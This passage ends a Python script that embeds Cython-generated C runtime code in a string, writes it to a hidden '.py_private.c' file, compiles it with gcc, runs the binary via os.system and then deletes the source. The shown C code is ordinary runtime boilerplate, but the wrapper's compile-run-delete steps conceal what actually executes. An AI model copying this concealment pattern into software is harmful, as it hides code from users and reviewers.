            msg = "async generator ignored GeneratorExit";
#endif
        #endif
        } else {
            msg = "generator ignored GeneratorExit";
        }
        PyErr_SetString(PyExc_RuntimeError, msg);
        return NULL;
    }
    raised_exception = PyErr_Occurred();
    if (likely(!raised_exception || __Pyx_PyErr_GivenExceptionMatches2(raised_exception, PyExc_GeneratorExit, PyExc_StopIteration))) {
        if (raised_exception) PyErr_Clear();
        Py_INCREF(Py_None);
        return Py_None;
    }
    return NULL;
}
static PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,
                                        PyObject *args, int close_on_genexit) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        Py_INCREF(yf);
        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {
            int err = __Pyx_Coroutine_CloseIter(gen, yf);
            Py_DECREF(yf);
            __Pyx_Coroutine_Undelegate(gen);
            if (err < 0)
                return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
            goto throw_here;
        }
        gen->is_running = 1;
        if (0
        #ifdef __Pyx_Generator_USED
            || __Pyx_Generator_CheckExact(yf)
        #endif
        #ifdef __Pyx_Coroutine_USED
            || __Pyx_Coroutine_Check(yf)
        #endif
            ) {
            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {
            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);
        #endif
        } else {
            PyObject *meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_throw);
            if (unlikely(!meth)) {
                Py_DECREF(yf);
                if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                    gen->is_running = 0;
                    return NULL;
                }
                PyErr_Clear();
                __Pyx_Coroutine_Undelegate(gen);
                gen->is_running = 0;
                goto throw_here;
            }
            if (likely(args)) {
                ret = PyObject_CallObject(meth, args);
            } else {
                ret = PyObject_CallFunctionObjArgs(meth, typ, val, tb, NULL);
            }
            Py_DECREF(meth);
        }
        gen->is_running = 0;
        Py_DECREF(yf);
        if (!ret) {
            ret = __Pyx_Coroutine_FinishDelegation(gen);
        }
        return __Pyx_Coroutine_MethodReturn(self, ret);
    }
throw_here:
    __Pyx_Raise(typ, val, tb, NULL);
    return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
}
static PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {
    PyObject *typ;
    PyObject *val = NULL;
    PyObject *tb = NULL;
    if (!PyArg_UnpackTuple(args, (char *)"throw", 1, 3, &typ, &val, &tb))
        return NULL;
    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);
}
static CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {
    Py_VISIT(exc_state->exc_type);
    Py_VISIT(exc_state->exc_value);
    Py_VISIT(exc_state->exc_traceback);
    return 0;
}
static int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {
    Py_VISIT(gen->closure);
    Py_VISIT(gen->classobj);
    Py_VISIT(gen->yieldfrom);
    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);
}
static int __Pyx_Coroutine_clear(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    Py_CLEAR(gen->closure);
    Py_CLEAR(gen->classobj);
    Py_CLEAR(gen->yieldfrom);
    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);
    }
#endif
    Py_CLEAR(gen->gi_code);
    Py_CLEAR(gen->gi_frame);
    Py_CLEAR(gen->gi_name);
    Py_CLEAR(gen->gi_qualname);
    Py_CLEAR(gen->gi_modulename);
    return 0;
}
static void __Pyx_Coroutine_dealloc(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject_GC_UnTrack(gen);
    if (gen->gi_weakreflist != NULL)
        PyObject_ClearWeakRefs(self);
    if (gen->resume_label >= 0) {
        PyObject_GC_Track(self);
#if PY_VERSION_HEX >= 0x030400a1 && CYTHON_USE_TP_FINALIZE
        if (PyObject_CallFinalizerFromDealloc(self))
#else
        Py_TYPE(gen)->tp_del(self);
        if (Py_REFCNT(self) > 0)
#endif
        {
            return;
        }
        PyObject_GC_UnTrack(self);
    }
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        /* We have to handle this case for asynchronous generators
           right here, because this code has to be between UNTRACK
           and GC_Del. */
        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);
    }
#endif
    __Pyx_Coroutine_clear(self);
    PyObject_GC_Del(gen);
}
static void __Pyx_Coroutine_del(PyObject *self) {
    PyObject *error_type, *error_value, *error_traceback;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    __Pyx_PyThreadState_declare
    if (gen->resume_label < 0) {
        return;
    }
#if !CYTHON_USE_TP_FINALIZE
    assert(self->ob_refcnt == 0);
    __Pyx_SET_REFCNT(self, 1);
#endif
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;
        PyObject *finalizer = agen->ag_finalizer;
        if (finalizer && !agen->ag_closed) {
            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);
            if (unlikely(!res)) {
                PyErr_WriteUnraisable(self);
            } else {
                Py_DECREF(res);
            }
            __Pyx_ErrRestore(error_type, error_value, error_traceback);
            return;
        }
    }
#endif
    if (unlikely(gen->resume_label == 0 && !error_value)) {
#ifdef __Pyx_Coroutine_USED
#ifdef __Pyx_Generator_USED
    if (!__Pyx_Generator_CheckExact(self))
#endif
        {
        PyObject_GC_UnTrack(self);
#if PY_MAJOR_VERSION >= 3  || defined(PyErr_WarnFormat)
        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine '%.50S' was never awaited", gen->gi_qualname) < 0))
            PyErr_WriteUnraisable(self);
#else
        {PyObject *msg;
        char *cmsg;
        #if CYTHON_COMPILING_IN_PYPY
        msg = NULL;
        cmsg = (char*) "coroutine was never awaited";
        #else
        char *cname;
        PyObject *qualname;
        qualname = gen->gi_qualname;
        cname = PyString_AS_STRING(qualname);
        msg = PyString_FromFormat("coroutine '%.50s' was never awaited", cname);
        if (unlikely(!msg)) {
            PyErr_Clear();
            cmsg = (char*) "coroutine was never awaited";
        } else {
            cmsg = PyString_AS_STRING(msg);
        }
        #endif
        if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, cmsg, 1) < 0))
            PyErr_WriteUnraisable(self);
        Py_XDECREF(msg);}
#endif
        PyObject_GC_Track(self);
        }
#endif
    } else {
        PyObject *res = __Pyx_Coroutine_Close(self);
        if (unlikely(!res)) {
            if (PyErr_Occurred())
                PyErr_WriteUnraisable(self);
        } else {
            Py_DECREF(res);
        }
    }
    __Pyx_ErrRestore(error_type, error_value, error_traceback);
#if !CYTHON_USE_TP_FINALIZE
    assert(Py_REFCNT(self) > 0);
    if (--self->ob_refcnt == 0) {
        return;
    }
    {
        Py_ssize_t refcnt = Py_REFCNT(self);
        _Py_NewReference(self);
        __Pyx_SET_REFCNT(self, refcnt);
    }
#if CYTHON_COMPILING_IN_CPYTHON
    assert(PyType_IS_GC(Py_TYPE(self)) &&
           _Py_AS_GC(self)->gc.gc_refs != _PyGC_REFS_UNTRACKED);
    _Py_DEC_REFTOTAL;
#endif
#ifdef COUNT_ALLOCS
    --Py_TYPE(self)->tp_frees;
    --Py_TYPE(self)->tp_allocs;
#endif
#endif
}
static PyObject *
__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_name;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_name;
    Py_INCREF(value);
    self->gi_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_qualname;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_qualname;
    Py_INCREF(value);
    self->gi_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *frame = self->gi_frame;
    if (!frame) {
        if (unlikely(!self->gi_code)) {
            Py_RETURN_NONE;
        }
        frame = (PyObject *) PyFrame_New(
            PyThreadState_Get(),            /*PyThreadState *tstate,*/
            (PyCodeObject*) self->gi_code,  /*PyCodeObject *code,*/
            __pyx_d,                 /*PyObject *globals,*/
            0                               /*PyObject *locals*/
        );
        if (unlikely(!frame))
            return NULL;
        self->gi_frame = frame;
    }
    Py_INCREF(frame);
    return frame;
}
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);
    if (unlikely(!gen))
        return NULL;
    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);
}
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    gen->body = body;
    gen->closure = closure;
    Py_XINCREF(closure);
    gen->is_running = 0;
    gen->resume_label = 0;
    gen->classobj = NULL;
    gen->yieldfrom = NULL;
    gen->gi_exc_state.exc_type = NULL;
    gen->gi_exc_state.exc_value = NULL;
    gen->gi_exc_state.exc_traceback = NULL;
#if CYTHON_USE_EXC_INFO_STACK
    gen->gi_exc_state.previous_item = NULL;
#endif
    gen->gi_weakreflist = NULL;
    Py_XINCREF(qualname);
    gen->gi_qualname = qualname;
    Py_XINCREF(name);
    gen->gi_name = name;
    Py_XINCREF(module_name);
    gen->gi_modulename = module_name;
    Py_XINCREF(code);
    gen->gi_code = code;
    gen->gi_frame = NULL;
    PyObject_GC_Track(gen);
    return gen;
}

/* PatchModuleWithCoroutine */
    static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    int result;
    PyObject *globals, *result_obj;
    globals = PyDict_New();  if (unlikely(!globals)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_coroutine_type",
    #ifdef __Pyx_Coroutine_USED
        (PyObject*)__pyx_CoroutineType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_generator_type",
    #ifdef __Pyx_Generator_USED
        (PyObject*)__pyx_GeneratorType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "_module", module) < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "__builtins__", __pyx_b) < 0)) goto ignore;
    result_obj = PyRun_String(py_code, Py_file_input, globals, globals);
    if (unlikely(!result_obj)) goto ignore;
    Py_DECREF(result_obj);
    Py_DECREF(globals);
    return module;
ignore:
    Py_XDECREF(globals);
    PyErr_WriteUnraisable(module);
    if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, "Cython module failed to patch module with custom type", 1) < 0)) {
        Py_DECREF(module);
        module = NULL;
    }
#else
    py_code++;
#endif
    return module;
}

/* PatchGeneratorABC */
    #ifndef CYTHON_REGISTER_ABCS
#define CYTHON_REGISTER_ABCS 1
#endif
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
static PyObject* __Pyx_patch_abc_module(PyObject *module);
static PyObject* __Pyx_patch_abc_module(PyObject *module) {
    module = __Pyx_Coroutine_patch_module(
        module, ""
"if _cython_generator_type is not None:\n"
"    try: Generator = _module.Generator\n"
"    except AttributeError: pass\n"
"    else: Generator.register(_cython_generator_type)\n"
"if _cython_coroutine_type is not None:\n"
"    try: Coroutine = _module.Coroutine\n"
"    except AttributeError: pass\n"
"    else: Coroutine.register(_cython_coroutine_type)\n"
    );
    return module;
}
#endif
static int __Pyx_patch_abc(void) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    static int abc_patched = 0;
    if (CYTHON_REGISTER_ABCS && !abc_patched) {
        PyObject *module;
        module = PyImport_ImportModule((PY_MAJOR_VERSION >= 3) ? "collections.abc" : "collections");
        if (!module) {
            PyErr_WriteUnraisable(NULL);
            if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning,
                    ((PY_MAJOR_VERSION >= 3) ?
                        "Cython module failed to register with collections.abc module" :
                        "Cython module failed to register with collections module"), 1) < 0)) {
                return -1;
            }
        } else {
            module = __Pyx_patch_abc_module(module);
            abc_patched = 1;
            if (unlikely(!module))
                return -1;
            Py_DECREF(module);
        }
        module = PyImport_ImportModule("backports_abc");
        if (module) {
            module = __Pyx_patch_abc_module(module);
            Py_XDECREF(module);
        }
        if (!module) {
            PyErr_Clear();
        }
    }
#else
    if ((0)) __Pyx_Coroutine_patch_module(NULL, NULL);
#endif
    return 0;
}

/* Generator */
    static PyMethodDef __pyx_Generator_methods[] = {
    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into generator,\nreturn next yielded value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in generator,\nreturn next yielded value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside generator.")},
    {0, 0, 0, 0}
};
static PyMemberDef __pyx_Generator_memberlist[] = {
    {(char *) "gi_running", T_BOOL, offsetof(__pyx_CoroutineObject, is_running), READONLY, NULL},
    {(char*) "gi_yieldfrom", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,
     (char*) PyDoc_STR("object being iterated by 'yield from', or None")},
    {(char*) "gi_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},
    {0, 0, 0, 0, 0}
};
static PyGetSetDef __pyx_Generator_getsets[] = {
    {(char *) "__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,
     (char*) PyDoc_STR("name of the generator"), 0},
    {(char *) "__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,
     (char*) PyDoc_STR("qualified name of the generator"), 0},
    {(char *) "gi_frame", (getter)__Pyx_Coroutine_get_frame, NULL,
     (char*) PyDoc_STR("Frame of the generator"), 0},
    {0, 0, 0, 0, 0}
};
static PyTypeObject __pyx_GeneratorType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    (destructor) __Pyx_Coroutine_dealloc,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    0,
    (traverseproc) __Pyx_Coroutine_traverse,
    0,
    0,
    offsetof(__pyx_CoroutineObject, gi_weakreflist),
    0,
    (iternextfunc) __Pyx_Generator_Next,
    __pyx_Generator_methods,
    __pyx_Generator_memberlist,
    __pyx_Generator_getsets,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if CYTHON_USE_TP_FINALIZE
    0,
#else
    __Pyx_Coroutine_del,
#endif
    0,
#if CYTHON_USE_TP_FINALIZE
    __Pyx_Coroutine_del,
#elif PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_Generator_init(void) {
    __pyx_GeneratorType_type.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
    __pyx_GeneratorType_type.tp_iter = PyObject_SelfIter;
    __pyx_GeneratorType = __Pyx_FetchCommonType(&__pyx_GeneratorType_type);
    if (unlikely(!__pyx_GeneratorType)) {
        return -1;
    }
    return 0;
}

/* CStringEquals */
    static CYTHON_INLINE int __Pyx_StrEq(const char *s1, const char *s2) {
    while (*s1 != '\0' && *s1 == *s2) { s1++; s2++; }
    return *s1 == *s2;
}

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
